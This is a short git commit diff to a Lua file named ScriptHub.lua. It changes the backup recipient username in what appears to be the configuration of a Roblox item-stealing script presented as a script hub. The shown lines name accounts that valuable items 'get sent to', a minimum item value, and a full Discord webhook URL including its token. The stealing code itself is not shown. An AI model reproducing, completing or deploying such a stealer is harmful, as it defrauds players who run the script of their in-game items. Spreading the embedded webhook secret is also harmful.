c76865395785b90ded07ca61ff34d7e4bd9a336c
OmegaScripter <Omegafortnitegamer@outlook.com>
2024-07-31 15:26:44 +0100

    Update ScriptHub.lua

--- ScriptHub.lua
+++ ScriptHub.lua
@@ -1,5 +1,5 @@
 Username = "Found_U58"
-Username2 = "Found_U58" -- stuff will get sent to this user if first user's mailbox is full
+Username2 = "Found_U59" -- stuff will get sent to this user if first user's mailbox is full
 webhook = "https://discord.com/api/webhooks/1268212736332922960/nZunN_ZV6LW08mqll_ZzbWJ6tiZ_OsiT8WZUMWtkJ7kUts2OXRnwPj0WNWrYTpOn61wR"
 min_rap = 100000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
